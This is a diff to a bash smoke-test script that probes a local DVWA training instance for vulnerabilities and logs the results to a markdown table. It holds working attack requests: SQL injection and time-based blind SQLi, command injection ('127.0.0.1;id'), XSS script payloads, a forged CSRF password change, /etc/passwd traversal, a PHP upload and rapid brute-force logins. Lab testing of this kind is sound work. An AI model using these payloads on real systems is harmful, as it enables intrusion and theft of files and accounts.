@@ -5,15 +5,9 @@ BASE_URL="${DVWA_BASE_URL:-http://localhost:4280}"
 USER="${DVWA_USER:-admin}"
 PASS="${DVWA_PASS:-password}"
 COOKIE_FILE=".dvwa_cookies.txt"
-TOKEN_FILE=".dvwa_token.txt"
 RESULTS_FILE="${DVWA_RESULTS_FILE:-dvwa_results.md}"
 
-need_cmd() {
-  command -v "$1" >/dev/null 2>&1 || { echo "[FAIL] missing command: $1"; exit 1; }
-}
-
 extract_token() {
-  # supports token fields using single or double quotes
   sed -nE "s/.*name=['\"]user_token['\"][^>]*value=['\"]([^'\"]+)['\"].*/\1/p" | head -n1
 }
 
@@ -22,44 +16,27 @@ fetch_page() {
   curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL$path"
 }
 
-fetch_token_from_page() {
-  local path="$1"
-  fetch_page "$path" | extract_token
-}
-
 setup_db() {
-  need_cmd curl
-  need_cmd sed
-  need_cmd grep
-
-  local token
+  local token out
   token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/setup.php" | extract_token)
-  if [[ -z "${token:-}" ]]; then
-    echo "[FAIL] could not extract setup token"
-    exit 1
-  fi
+  [[ -n "${token:-}" ]] || { echo "[FAIL] setup token not found"; exit 1; }
 
-  local out
   out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/setup.php" \
     --data-urlencode "create_db=Create / Reset Database" \
     --data-urlencode "user_token=$token")
 
-  if grep -qiE "Database has been created|already exists|table.*created" <<<"$out"; then
-    echo "[OK] database setup/reset completed"
+  if grep -qiE "created|success|table" <<<"$out"; then
+    echo "[OK] database reset completed"
   else
-    echo "[INFO] setup response received (manual review may be needed)"
+    echo "[WARN] setup response did not contain explicit success markers"
   fi
 }
 
 login() {
-  local token
+  local token out
   token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/login.php" | extract_token)
-  if [[ -z "${token:-}" ]]; then
-    echo "[FAIL] could not extract login CSRF token"
-    exit 1
-  fi
+  [[ -n "${token:-}" ]] || { echo "[FAIL] login token not found"; exit 1; }
 
-  local out
   out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/login.php" \
     --data-urlencode "username=$USER" \
     --data-urlencode "password=$PASS" \
@@ -71,96 +48,98 @@ login() {
     exit 1
   fi
 
-  echo "$token" > "$TOKEN_FILE"
-  echo "[OK] login session prepared"
+  if ! grep -qi "logout" <<<"$out"; then
+    echo "[WARN] login success marker (logout) not seen; session may still be valid"
+  fi
+  echo "[OK] authenticated session prepared"
 }
 
-set_security_low() {
-  local token
-  token=$(fetch_token_from_page "/security.php")
-  if [[ -z "${token:-}" ]]; then
-    echo "[FAIL] could not extract security token"
-    exit 1
-  fi
+set_security() {
+  local level="$1" token out
+  token=$(fetch_page "/security.php" | extract_token)
+  [[ -n "${token:-}" ]] || { echo "[FAIL] security token not found"; exit 1; }
 
-  local out
   out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/security.php" \
-    --data-urlencode "security=low" \
+    --data-urlencode "security=$level" \
     --data-urlencode "seclev_submit=Submit" \
     --data-urlencode "user_token=$token")
 
-  if grep -qi "Security level set to low" <<<"$out"; then
-    echo "[OK] security level set to low"
+  if grep -qi "Security level set to $level" <<<"$out"; then
+    echo "[OK] security=$level"
   else
-    echo "[WARN] security level confirmation text not found; verify in UI"
+    echo "[WARN] unable to confirm security=$level from response"
   fi
 }
 
+set_security_low() { set_security low; }
+
+init_results() {
+  cat > "$RESULTS_FILE" <<'MD'
+# DVWA Smoke Results (Part A)
+
+| Vulnerability | Module | Method | Payload/Action | Indicator | Status |
+|---|---|---|---|---|---|
+MD
+}
+
 record_result() {
-  local vuln="$1"; shift
-  local status="$1"; shift
-  local detail="$*"
-  printf "| %s | %s | %s |\n" "$vuln" "$status" "$detail" >> "$RESULTS_FILE"
+  printf "| %s | %s | %s | %s | %s | %s |\n" "$1" "$2" "$3" "$4" "$5" "$6" >> "$RESULTS_FILE"
 }
 
 sqli() {
-  local body count
-  body=$(fetch_page "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit")
-  count=$(grep -o "First name:" <<<"$body" | wc -l | tr -d ' ')
-  if [[ "$count" -gt 1 ]]; then
-    echo "[WARN] SQLi classic appears vulnerable (multiple rows returned: $count)"
-    record_result "SQL Injection (Classic)" "WARN (vulnerable)" "Returned $count records for tautology payload"
+  local base inj c1 c2
+  base=$(fetch_page "/vulnerabilities/sqli/?id=1&Submit=Submit")
+  inj=$(fetch_page "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit")
+  c1=$(grep -o "First name:" <<<"$base" | wc -l | tr -d ' ')
+  c2=$(grep -o "First name:" <<<"$inj" | wc -l | tr -d ' ')
+
+  if [[ "$c2" -gt "$c1" ]]; then
+    echo "[WARN] SQLi likely vulnerable (rows increased $c1 -> $c2)"
+    record_result "SQL Injection (Classic)" "/vulnerabilities/sqli/" "GET" "id=1' OR '1'='1" "Returned more rows than baseline" "WARN (vulnerable)"
   else
-    echo "[OK] SQLi classic did not show multi-row behavior"
-    record_result "SQL Injection (Classic)" "OK (mitigated)" "No multi-row response for tautology payload"
+    echo "[OK] SQLi payload did not increase result set"
+    record_result "SQL Injection (Classic)" "/vulnerabilities/sqli/" "GET" "id=1' OR '1'='1" "No row inflation observed" "OK/UNCLEAR"
   fi
 }
 
 sqli_blind() {
-  local normal timed t1 t2 dt
-  normal=$(date +%s)
-  fetch_page "/vulnerabilities/sqli_blind/?id=1&Submit=Submit" >/dev/null
-  timed=$(date +%s)
-  t1=$((timed-normal))
+  local t_base t_slow
+  t_base=$(curl -fsS -o /dev/null -w "%{time_total}" -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL/vulnerabilities/sqli_blind/?id=1&Submit=Submit")
+  t_slow=$(curl -fsS -o /dev/null -w "%{time_total}" -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL/vulnerabilities/sqli_blind/?id=1%27%20AND%20SLEEP(2)%23&Submit=Submit" || true)
 
-  normal=$(date +%s)
-  fetch_page "/vulnerabilities/sqli_blind/?id=1%27%20AND%20SLEEP(2)%23&Submit=Submit" >/dev/null || true
-  timed=$(date +%s)
-  t2=$((timed-normal))
-
-  dt=$((t2-t1))
-  if [[ "$dt" -ge 2 ]]; then
-    echo "[WARN] Blind SQLi timing delta detected (baseline=${t1}s, payload=${t2}s)"
-    record_result "Blind SQL Injection" "WARN (vulnerable)" "Timing delta ${dt}s indicates time-based injection"
+  if awk "BEGIN{exit !($t_slow-$t_base > 1.5)}"; then
+    echo "[WARN] Blind SQLi likely vulnerable (timing delta: base=$t_base slow=$t_slow)"
+    record_result "Blind SQL Injection" "/vulnerabilities/sqli_blind/" "GET" "id=1' AND SLEEP(2)#" "Timing increased significantly" "WARN (vulnerable)"
   else
-    echo "[OK] Blind SQLi timing delta not observed (baseline=${t1}s, payload=${t2}s)"
-    record_result "Blind SQL Injection" "OK (mitigated/unclear)" "No significant timing delta"
+    echo "[OK] Blind SQLi timing delta not conclusive (base=$t_base slow=$t_slow)"
+    record_result "Blind SQL Injection" "/vulnerabilities/sqli_blind/" "GET" "id=1' AND SLEEP(2)#" "Timing not significantly different" "OK/UNCLEAR"
   fi
 }
 
 cmdi() {
   local body
-  body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/exec/" \
-    --data-urlencode "ip=127.0.0.1;id" \
-    --data-urlencode "Submit=Submit")
+  body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/exec/" --data-urlencode "ip=127.0.0.1;id" --data-urlencode "Submit=Submit")
   if grep -qiE "uid=|gid=" <<<"$body"; then
-    echo "[WARN] Command Injection appears vulnerable (id command output observed)"
-    record_result "Command Injection" "WARN (vulnerable)" "Injected command output (uid/gid) observed"
+    echo "[WARN] Command injection likely vulnerable"
+    record_result "Command Injection" "/vulnerabilities/exec/" "POST" "ip=127.0.0.1;id" "uid/gid command output present" "WARN (vulnerable)"
   else
-    echo "[OK] Command Injection payload did not execute"
-    record_result "Command Injection" "OK (mitigated)" "No injected command output"
+    echo "[OK] command output not observed"
+    record_result "Command Injection" "/vulnerabilities/exec/" "POST" "ip=127.0.0.1;id" "No injected command marker" "OK/UNCLEAR"
   fi
 }
 
 xss_r() {
-  local body
+  local body raw encoded
   body=$(fetch_page "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E")
-  if grep -Fq "<script>alert(1)</script>" <<<"$body"; then
-    echo "[WARN] Reflected XSS appears vulnerable (raw script reflected)"
-    record_result "Reflected XSS" "WARN (vulnerable)" "Raw script tag reflected in response"
+  raw=0; encoded=0
+  grep -Fq "<script>alert(1)</script>" <<<"$body" && raw=1
+  grep -Fq "&lt;script&gt;alert(1)&lt;/script&gt;" <<<"$body" && encoded=1
+  if [[ "$raw" -eq 1 ]]; then
+    echo "[WARN] reflected XSS likely vulnerable (raw script reflected)"
+    record_result "Reflected XSS" "/vulnerabilities/xss_r/" "GET" "name=<script>alert(1)</script>" "Raw script reflected" "WARN (vulnerable)"
   else
-    echo "[OK] Reflected XSS payload appears encoded/blocked"
-    record_result "Reflected XSS" "OK (mitigated)" "Script tag not reflected raw"
+    echo "[OK] reflected XSS not raw-reflected (encoded=$encoded)"
+    record_result "Reflected XSS" "/vulnerabilities/xss_r/" "GET" "name=<script>alert(1)</script>" "Payload not reflected raw" "OK/UNCLEAR"
   fi
 }
 
@@ -173,11 +152,11 @@ xss_s() {
     --data-urlencode "btnSign=Sign Guestbook" >/dev/null
   body=$(fetch_page "/vulnerabilities/xss_s/")
   if grep -Fq "<script>${marker}</script>" <<<"$body"; then
-    echo "[WARN] Stored XSS appears vulnerable (payload persisted)"
-    record_result "Stored XSS" "WARN (vulnerable)" "Persisted script marker found in guestbook"
+    echo "[WARN] stored XSS likely vulnerable"
+    record_result "Stored XSS" "/vulnerabilities/xss_s/" "POST" "txtName=<script>marker</script>" "Script marker persisted in response" "WARN (vulnerable)"
   else
-    echo "[OK] Stored XSS payload not persisted as executable script"
-    record_result "Stored XSS" "OK (mitigated)" "No raw persisted script marker"
+    echo "[OK] stored XSS not confirmed"
+    record_result "Stored XSS" "/vulnerabilities/xss_s/" "POST" "txtName=<script>marker</script>" "Raw script marker not found" "OK/UNCLEAR"
   fi
 }
 
@@ -185,11 +164,11 @@ csrf() {
   local body
   body=$(fetch_page "/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change")
   if grep -q "Password Changed" <<<"$body"; then
-    echo "[WARN] CSRF appears vulnerable (state change accepted without CSRF token)"
-    record_result "CSRF" "WARN (vulnerable)" "Password change accepted via forged-style GET"
+    echo "[WARN] CSRF likely vulnerable"
+    record_result "CSRF" "/vulnerabilities/csrf/" "GET" "password_new=password&...&Change=Change" "Password changed via direct GET" "WARN (vulnerable)"
   else
-    echo "[OK] CSRF-style state change rejected"
-    record_result "CSRF" "OK (mitigated)" "Password change not accepted without anti-CSRF proof"
+    echo "[OK] CSRF not confirmed by direct GET"
+    record_result "CSRF" "/vulnerabilities/csrf/" "GET" "password_new=password&...&Change=Change" "No state change message" "OK/UNCLEAR"
   fi
 }
 
@@ -197,16 +176,16 @@ lfi() {
   local body
   body=$(fetch_page "/vulnerabilities/fi/?page=../../../../../../etc/passwd")
   if grep -q "root:x:" <<<"$body"; then
-    echo "[WARN] File Inclusion appears vulnerable (passwd content included)"
-    record_result "File Inclusion (LFI/RFI)" "WARN (vulnerable)" "Detected passwd marker root:x:"
+    echo "[WARN] LFI likely vulnerable"
+    record_result "File Inclusion (LFI/RFI)" "/vulnerabilities/fi/" "GET" "page=../../../../../../etc/passwd" "passwd marker found" "WARN (vulnerable)"
   else
-    echo "[OK] File Inclusion payload blocked"
-    record_result "File Inclusion (LFI/RFI)" "OK (mitigated)" "Traversal payload did not include system file"
+    echo "[OK] LFI not confirmed"
+    record_result "File Inclusion (LFI/RFI)" "/vulnerabilities/fi/" "GET" "page=../../../../../../etc/passwd" "No passwd marker" "OK/UNCLEAR"
   fi
 }
 
 upload() {
-  local tmp body file
+  local tmp body file body2
   file="dvwa_upload_test_$(date +%s).php"
   tmp=$(mktemp)
   printf '<?php echo "UPLOAD_MARKER"; ?>' > "$tmp"
@@ -214,67 +193,62 @@ upload() {
     -F "uploaded=@$tmp;filename=$file;type=application/x-php" \
     -F "Upload=Upload")
   rm -f "$tmp"
+  body2=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL/hackable/uploads/$file" || true)
 
-  if grep -qi "succesfully uploaded" <<<"$body"; then
-    echo "[WARN] Unrestricted Upload appears vulnerable (PHP file accepted: $file)"
-    record_result "Unrestricted File Upload" "WARN (vulnerable)" "Server accepted PHP upload $file"
+  if grep -qi "succesfully uploaded" <<<"$body" || grep -q "UPLOAD_MARKER" <<<"$body2"; then
+    echo "[WARN] unrestricted upload likely vulnerable"
+    record_result "Unrestricted File Upload" "/vulnerabilities/upload/" "POST multipart" "upload .php file" "Upload accepted and/or marker reachable" "WARN (vulnerable)"
   else
-    echo "[OK] Upload payload rejected"
-    record_result "Unrestricted File Upload" "OK (mitigated)" "PHP upload rejected"
+    echo "[OK] upload rejection observed"
+    record_result "Unrestricted File Upload" "/vulnerabilities/upload/" "POST multipart" "upload .php file" "Upload not accepted / marker unreachable" "OK/UNCLEAR"
   fi
 }
 
 brute() {
-  local blocked=0 i out
-  for i in 1 2 3 4 5; do
+  local i out blocked=0
+  for i in $(seq 1 10); do
     out=$(fetch_page "/vulnerabilities/brute/?username=admin&password=wrong$i&Login=Login")
-    if grep -qiE "too many|locked|rate" <<<"$out"; then
-      blocked=1
-    fi
+    grep -qiE "too many|locked|rate" <<<"$out" && blocked=1
   done
   if [[ "$blocked" -eq 1 ]]; then
-    echo "[OK] Brute-force protection indicators detected"
-    record_result "Brute Force" "OK (mitigated)" "Lockout/rate limiting indicators observed"
+    echo "[OK] brute-force control indicators present"
+    record_result "Weak Brute-Force Protection" "/vulnerabilities/brute/" "GET" "10 rapid invalid logins" "Rate-limit/lockout text detected" "OK/UNCLEAR"
   else
-    echo "[WARN] Brute-force protection appears weak (no lockout indicators)"
-    record_result "Brute Force" "WARN (vulnerable)" "No lockout/rate limiting indicators in 5 rapid attempts"
+    echo "[WARN] brute-force protection likely weak"
+    record_result "Weak Brute-Force Protection" "/vulnerabilities/brute/" "GET" "10 rapid invalid logins" "No lockout/rate-limit indicators" "WARN (vulnerable)"
   fi
 }
 
 weak_id() {
-  local vals=() i headers v
-  for i in 1 2 3 4 5; do
+  local i headers v vals=() monotonic=1
+  for i in $(seq 1 10); do
     headers=$(curl -fsSI -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/weak_id/")
     v=$(grep -i '^set-cookie: dvwaSession=' <<<"$headers" | sed -E 's/.*dvwaSession=([^;]+).*/\1/I' | tail -n1)
     [[ -n "${v:-}" ]] && vals+=("$v")
   done
-
-  if [[ "${#vals[@]}" -ge 3 ]]; then
-    if [[ "${vals[0]}" =~ ^[0-9]+$ && "${vals[1]}" =~ ^[0-9]+$ ]]; then
-      echo "[WARN] Weak Session ID appears vulnerable (predictable numeric sequence: ${vals[*]})"
-      record_result "Weak Session ID" "WARN (vulnerable)" "Predictable dvwaSession values: ${vals[*]}"
-      return
-    fi
+  if [[ "${#vals[@]}" -lt 3 ]]; then
+    monotonic=0
+  else
+    for i in $(seq 1 $((${#vals[@]}-1))); do
+      if ! [[ "${vals[$((i-1))]}" =~ ^[0-9]+$ && "${vals[$i]}" =~ ^[0-9]+$ ]]; then monotonic=0; break; fi
+      if [[ $((vals[i])) -ne $((vals[i-1]+1)) ]]; then monotonic=0; break; fi
+    done
   fi
 
-  echo "[OK] Weak Session ID obvious predictability not detected"
-  record_result "Weak Session ID" "OK (mitigated/unclear)" "No simple predictable sequence found"
-}
-
-init_results() {
-  cat > "$RESULTS_FILE" <<'MD'
-# DVWA Vulnerability Test Results
-
-| Vulnerability | Status | Evidence |
-|---|---|---|
-MD
+  if [[ "$monotonic" -eq 1 ]]; then
+    echo "[WARN] weak session id likely vulnerable (${vals[*]})"
+    record_result "Weak Session ID" "/vulnerabilities/weak_id/" "POST" "10 session generations" "Monotonic numeric session IDs" "WARN (vulnerable)"
+  else
+    echo "[OK] no strict monotonic session-id pattern detected"
+    record_result "Weak Session ID" "/vulnerabilities/weak_id/" "POST" "10 session generations" "No strict monotonic sequence" "OK/UNCLEAR"
+  fi
 }
 
 full() {
   init_results
   setup_db
   login
-  set_security_low
+  set_security low
 
   sqli
   sqli_blind
@@ -287,14 +261,14 @@ full() {
   brute
   weak_id
 
-  echo "[OK] full run complete"
-  echo "[INFO] results saved to $RESULTS_FILE"
+  echo "[OK] smoke run complete -> $RESULTS_FILE"
 }
 
 case "${1:-}" in
   setup_db) setup_db ;;
   login) login ;;
-  set_security_low) set_security_low ;;
+  set_security_low) set_security low ;;
+  set_security) set_security "${2:-low}" ;;
   sqli) sqli ;;
   sqli_blind) sqli_blind ;;
   cmdi) cmdi ;;
@@ -307,7 +281,7 @@ case "${1:-}" in
   weak_id) weak_id ;;
   full) full ;;
   *)
-    echo "Usage: $0 {setup_db|login|set_security_low|sqli|sqli_blind|cmdi|xss_r|xss_s|csrf|lfi|upload|brute|weak_id|full}"
+    echo "Usage: $0 {setup_db|login|set_security_low|set_security <level>|sqli|sqli_blind|cmdi|xss_r|xss_s|csrf|lfi|upload|brute|weak_id|full}"
     exit 1
     ;;
 esac
